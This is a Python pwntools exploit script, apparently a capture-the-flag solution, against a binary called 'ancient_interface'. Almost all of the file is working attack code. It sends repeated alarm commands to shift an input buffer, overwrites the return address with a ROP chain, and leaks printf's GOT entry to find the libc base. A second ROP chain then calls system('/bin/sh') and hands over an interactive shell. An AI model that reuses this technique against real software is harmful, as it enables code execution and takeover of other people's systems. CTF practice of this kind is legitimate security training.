#!/usr/bin/python3

from pwn import *
import time

exe = ELF("./ancient_interface", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '59', '-I']
context.log_level 	= "WARNING"
isDebug = False

# break *0x0000000000401876
# break *0x0000000000401A15
# break *0x000000000040101a
# break *0x0000000000401d43
# break *0x0000000000401B12
# break *0x0000000000401a1a
# break *0x0000000000401A38
# break *0x00000000004019A6
gs = '''
handle SIGALRM pass
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)


def extract_address(data):
	end_index = data.find(b"user@host")

	start_index = data.rfind(b"\n", 0, end_index) + 1  # Skips the newline character

	if start_index == -1 or end_index == -1:
		raise ValueError("Address delimiter not found in the data")

	# Extract the address and remove any leading null bytes
	extracted_address = data[start_index:end_index].lstrip(b'\x00')

	# Ensure the address is exactly 8 bytes long for u64
	extracted_address = extracted_address.ljust(8, b'\x00')

	extracted_address_int = u64(extracted_address)

	libc_base = extracted_address_int - libc_printf_offset # printf
	return libc_base

def leak_libc(variableName: str = "libc") -> int:
	number_of_alerts = 40
	payload_size = 5 * 8

	# Shift the buffer back 40 bytes (each alarm will make read() return -1 in the program)
	for i in range(number_of_alerts):
		time.sleep(0.1)
		cmd_alarm(5)	

	# After alarms are set, put the program into read() function
	io.sendlineafter(b"user@host$ ", f"read {payload_size} {variableName}{number_of_alerts}".encode())

	payload = flat(
		bin_ret,
		bin_pop_rdi,
		exe.got['printf'],
		exe.plt['printf'],
		bin_main,
	)

	# we wait for all the alerts to execute
	print(f"Sleeping for 10 seconds...")
	sleep(10)
	
	# Now that the buffer is shifted back, we will overwrite return address and start the ROP chain.
	print("Sending payload to leak printf address")
	io.sendline(payload)

	# grab the print out and extract the leaked address. 
	result = io.recvuntil(b"user@host$ ")
	address = extract_address(result)

	print(f"libc base: {hex(address)}")
	return address


def cmd_alarm(time: int = 10):
	io.sendlineafter(b"user@host$ ", f"alarm {time}".encode())


def exploit(variableName: str = "pwn"):
	print(f"Trying to pwn...")
	print("Shifting buffer 40 bytes backwards")
	num_of_alerts = 40
	payload_size = 8 * 4

	# each alarm shifts the input buf back 1 byte.
	for i in range(num_of_alerts):
		time.sleep(0.1)
		cmd_alarm(10)	

	io.sendlineafter(b"user@host$ ", f"read {payload_size} {variableName}{num_of_alerts}".encode())

	payload = flat(
		bin_pop_rdi,
		libc_binsh,	
		libc_system,
	)

	# # we wait for all the alerts to execute
	print(f"Sleeping for 20 seconds... letting all the alarms to trigger safely")
	sleep(20) 

	io.send(payload)

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

#io = remote("159.65.51.138", 30768)
io = start_local(isDebug)
io.timeout = 0.3

print(f"PID: {io.pid}")

print("Leaking libc...")
sleep(1)
print("Setting 40 alarms to shift input buffer 40 bytes backwards")

bin_pop_rdi = 0x0000000000401d43 # pop rdi; ret;
bin_main = 0x0000000000401B16
bin_ret = 0x000000000040101a

libc_printf_offset = 0x00052b30 # !!! <-- replace me with remote offset
libc_base = leak_libc()
libc_binsh = libc_base + 0x0019604f # !!! <-- replace me with remote offset
libc_system = libc_base + 0x0004c920 # !!! <-- replace me with remote offset

print(f"{hex(libc_binsh)=}")
print(f"{hex(libc_system)=}")

# sleep for a bit ... trying to sync times
sleep(2)
exploit()

print("Sleeping for 10 seconds... letting exploit work before interactive shell")
sleep(10)

print("Enjoy your shell.")
io.interactive()